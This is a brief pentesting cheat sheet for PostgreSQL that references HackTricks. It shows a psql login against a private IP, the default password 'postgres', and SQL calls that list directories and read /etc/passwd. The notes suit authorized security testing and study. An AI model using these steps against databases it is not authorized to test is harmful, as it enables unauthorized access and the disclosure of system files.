# Pentesting Postgres

URL Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

User Authentication Example:

```
psql -U postgres -p 5437 -h 192.168.208.47
```

Default Passwords:

postgres

Read Directories:

```
pg_ls_dir('./');
```

Read Files:

```
pg_read_file('/etc/passwd');
```
